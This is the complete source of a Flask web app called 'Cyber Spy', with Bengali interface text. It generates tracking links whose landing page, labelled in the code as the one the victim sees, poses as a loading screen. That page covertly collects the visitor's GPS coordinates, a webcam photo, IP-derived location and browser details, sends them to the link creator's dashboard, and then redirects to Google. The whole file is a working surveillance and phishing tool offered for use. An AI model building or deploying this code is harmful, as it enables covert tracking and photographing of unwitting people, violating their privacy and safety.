from flask import Flask, render_template_string, request, redirect, url_for, session
from pymongo import MongoClient
import datetime
import hashlib
import os
import requests
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ===== MongoDB সংযোগ (Render-এর পরিবেশ থেকে MONGO_URI নাও) =====
MONGO_URI = os.environ.get('MONGO_URI')
if not MONGO_URI:
    raise Exception("MONGO_URI environment variable not set! Please add it in Render.")

try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client['spy_db']
    users_col = db['users']
    client.admin.command('ping')
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    raise

# ===== বেস CSS (মোবাইল-ফ্রেন্ডলি) =====
BASE_CSS = """
<style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
    body{background:#0a0e17;color:#00ffcc;padding:15px;min-height:100vh;display:flex;justify-content:center;align-items:center}
    .box{background:#111927;padding:25px 20px;border-radius:20px;width:100%;max-width:450px;box-shadow:0 0 30px #00ffcc11}
    h2{text-align:center;color:#ff0044;font-size:1.8rem;margin-bottom:10px}
    .sub{text-align:center;color:#886688;font-size:1rem;margin-bottom:20px}
    input,button{width:100%;padding:16px;margin:10px 0;border-radius:12px;border:1px solid #334466;background:#0b111e;color:#c0d4ff;font-size:1.1rem;touch-action:manipulation}
    button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold;transition:0.2s}
    button:hover{background:#ff004466}
    a{color:#00ffcc;display:inline-block;margin-top:10px;font-size:1rem}
    .error{color:#ff8866;margin-top:10px;padding:10px;background:#ff004422;border-radius:8px}
    .container{max-width:1200px;margin:auto;padding:15px}
    .card{background:#1a2332;padding:18px;border-radius:15px;margin:15px 0}
    .card input,.card button{padding:16px}
    table{width:100%;border-collapse:collapse;font-size:0.9rem}
    th,td{border:1px solid #334466;padding:10px;text-align:left;color:#c0d4ff;word-break:break-word}
    .del-btn{padding:8px 14px;background:#ff004422;border:1px solid #ff0044;border-radius:8px;cursor:pointer;color:#ffccbb;text-decoration:none}
    .logout{float:right;background:#334466;padding:10px 18px;border-radius:10px;color:#c0d4ff;text-decoration:none}
    .brand{text-align:center;color:#ff8866;font-size:0.9rem;margin:10px 0}
    img{max-width:80px;height:auto;border-radius:6px}
    @media(max-width:600px){
        .box{padding:20px 15px}
        h2{font-size:1.5rem}
        input,button{padding:18px;font-size:1.1rem}
        table{font-size:0.75rem}
        th,td{padding:6px}
        .container{padding:10px}
    }
</style>
"""

# ===== লগইন পেজ =====
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লগইন</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🕵️ Cyber Spy</h2>
    <div class="sub">Developer: Arif</div>
    <form method="POST">
        <input type="text" name="username" placeholder="ইউজারনেম" required>
        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
        <button type="submit">লগইন</button>
    </form>
    <a href="/register">নতুন ইউজার?</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== রেজিস্টার পেজ =====
REGISTER_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>রেজিস্টার</title>""" + BASE_CSS + """
</head>
<body>
<div class="box">
    <h2>🕵️ সাইন আপ</h2>
    <div class="sub">Developer: Arif</div>
    <form method="POST">
        <input type="text" name="username" placeholder="ইউজারনেম" required>
        <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
        <button type="submit">রেজিস্টার</button>
    </form>
    <a href="/login">ইতিমধ্যে আছে?</a>
    {% if error is defined and error %}
        <p class="error">{{ error }}</p>
    {% endif %}
</div>
</body>
</html>
"""

# ===== ড্যাশবোর্ড =====
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ড্যাশবোর্ড</title>""" + BASE_CSS + """
</head>
<body>
<div class="container">
    <h1 style="text-align:center;color:#ff0044;">🕵️ Cyber Spy</h1>
    <div class="brand">Developer: Arif</div>
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
        <span style="color:#6688aa;">স্বাগতম, {{ user.username }}</span>
        <a href="/logout" class="logout">🚪 লগআউট</a>
    </div>
    <div class="card">
        <h3>📎 নতুন লিংক তৈরি</h3>
        <form method="POST" action="/create_link">
            <input type="text" name="link_name" placeholder="লিংকের নাম (যেমন: ফেসবুক টুল)" required>
            <button type="submit">🔗 জেনারেট</button>
        </form>
    </div>
    <div class="card">
        <h3>📌 আপনার লিংকসমূহ</h3>
        {% for link in user.links %}
        <div style="background:#0d1520;padding:15px;border-radius:12px;margin:10px 0;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;">
            <span><strong>{{ link.name }}</strong><br><a href="{{ link.url }}" target="_blank" style="color:#00ffcc;word-break:break-all;">{{ link.url }}</a></span>
            <span>👁️ {{ link.visits|length }}</span>
            <a href="/view_link/{{ link.id }}" style="color:#ff0044;">📊 দেখুন</a>
        </div>
        {% else %}
        <p style="color:#6688aa;">কোনো লিংক তৈরি করেননি।</p>
        {% endfor %}
    </div>
</div>
</body>
</html>
"""

# ===== ভিজিটর ডেটা দেখার পেজ =====
VIEW_LINK_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ভিজিটর ডেটা</title>""" + BASE_CSS + """
</head>
<body>
<div class="container">
    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ ড্যাশবোর্ডে ফিরুন</a>
    <h1 style="text-align:center;color:#ff0044;">📊 {{ link.name }}</h1>
    <p style="color:#6688aa;">মোট ভিজিট: {{ link.visits|length }}</p>
    <div style="overflow-x:auto;">
    <table>
        <tr><th>#</th><th>IP</th><th>লোকেশন</th><th>GPS</th><th>ব্রাউজার</th><th>ক্যামেরা</th><th>স্ক্রিনশট</th><th>সময়</th><th>অ্যাকশন</th></tr>
        {% for v in link.visits %}
        <tr>
            <td>{{ loop.index }}</td>
            <td>{{ v.ip }}</td>
            <td>{{ v.city }}, {{ v.country }}</td>
            <td>{{ v.gps or 'নেই' }}</td>
            <td>{{ v.user_agent[:25] }}..</td>
            <td>{% if v.camera %}<img src="{{ v.camera }}" />{% else %}নেই{% endif %}</td>
            <td>{% if v.screenshot %}<img src="{{ v.screenshot }}" />{% else %}নেই{% endif %}</td>
            <td>{{ v.time }}</td>
            <td><a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️</a></td>
        </tr>
        {% endfor %}
    </table>
    </div>
</div>
</body>
</html>
"""

# ===== ডেটা কালেক্টর পেজ (ভিকটিম দেখবে) =====
COLLECTOR_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লোড হচ্ছে</title>
<style>
body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px;text-align:center}
.loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:20px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
p{font-size:1.2rem;color:#6688aa}
</style>
</head>
<body>
    <div class="loader"></div>
    <p>⏳ সংযোগ স্থাপন...</p>
    <script>
        let gps = 'অনুমতি নেই';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => { gps = pos.coords.latitude + ',' + pos.coords.longitude; },
                () => { gps = 'ব্যর্থ'; }
            );
        }
        let camera = null;
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320; canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    camera = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                    sendData();
                }, 2000);
            })
            .catch(() => { camera = 'ব্যর্থ'; sendData(); });

        function captureScreen() {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#0a0e17';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc';
            ctx.font = '20px monospace';
            ctx.fillText('সিকিউর স্ক্রিন', 20, 50);
            return canvas.toDataURL('image/png');
        }

        function sendData() {
            const data = {
                ip: "{{ ip }}",
                user_agent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                gps: gps,
                camera: camera,
                screenshot: captureScreen(),
                time: new Date().toLocaleString()
            };
            fetch('/collect/{{ link_id }}', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            });
        }
    </script>
</body>
</html>
"""

# ===== হেল্পার ফাংশন =====
def get_user(username):
    return users_col.find_one({'username': username})

def create_user(username, password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    user = {
        'username': username,
        'password': hashed,
        'links': []
    }
    users_col.insert_one(user)
    return user

# ===== রাউট =====
@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if not username or not password:
            error = 'ইউজারনেম ও পাসওয়ার্ড দিন'
        else:
            user = get_user(username)
            if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
                session['user'] = username
                return redirect(url_for('dashboard'))
            else:
                error = 'ভুল ক্রেডেনশিয়াল'
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if not username or not password:
            error = 'সব ফিল্ড পূরণ করুন'
        elif get_user(username):
            error = 'ইউজারনেম নেওয়া হয়েছে'
        else:
            create_user(username, password)
            return redirect(url_for('login'))
    return render_template_string(REGISTER_HTML, error=error)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML, user=user)

@app.route('/create_link', methods=['POST'])
def create_link():
    if 'user' not in session:
        return redirect(url_for('login'))
    link_name = request.form.get('link_name', '').strip()
    if not link_name:
        return redirect(url_for('dashboard'))
    link_id = str(uuid.uuid4())[:8]
    new_link = {
        'id': link_id,
        'name': link_name,
        'url': request.host_url + 'c/' + link_id,
        'visits': []
    }
    users_col.update_one({'username': session['user']}, {'$push': {'links': new_link}})
    return redirect(url_for('dashboard'))

@app.route('/c/<link_id>')
def collector_page(link_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    try:
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
        city = loc.get('city', 'অজানা')
        country = loc.get('country', 'অজানা')
    except:
        city = 'অজানা'
        country = 'অজানা'
    return render_template_string(COLLECTOR_HTML, ip=ip, link_id=link_id)

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    data = request.get_json()
    if not data:
        return 'ERROR: No data', 400
    data['time'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip = data.get('ip')
    if ip:
        try:
            loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=2).json()
            data['city'] = loc.get('city', 'অজানা')
            data['country'] = loc.get('country', 'অজানা')
        except:
            data['city'] = 'অজানা'
            data['country'] = 'অজানা'
    else:
        data['city'] = 'অজানা'
        data['country'] = 'অজানা'
    result = users_col.update_one(
        {'links.id': link_id},
        {'$push': {'links.$.visits': data}}
    )
    if result.matched_count:
        return 'OK', 200
    return 'ERROR: Link not found', 404

@app.route('/view_link/<link_id>')
def view_link(link_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    link = None
    for l in user['links']:
        if l['id'] == link_id:
            link = l
            break
    if not link:
        return 'লিংক পাওয়া যায়নি', 404
    return render_template_string(VIEW_LINK_HTML, link=link)

@app.route('/delete_visit/<link_id>/<int:index>')
def delete_visit(link_id, index):
    if 'user' not in session:
        return redirect(url_for('login'))
    user = get_user(session['user'])
    if not user:
        session.clear()
        return redirect(url_for('login'))
    for l in user['links']:
        if l['id'] == link_id:
            if 0 <= index < len(l['visits']):
                l['visits'].pop(index)
                users_col.update_one(
                    {'username': session['user'], 'links.id': link_id},
                    {'$set': {'links.$.visits': l['visits']}}
                )
                break
    return redirect(url_for('view_link', link_id=link_id))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)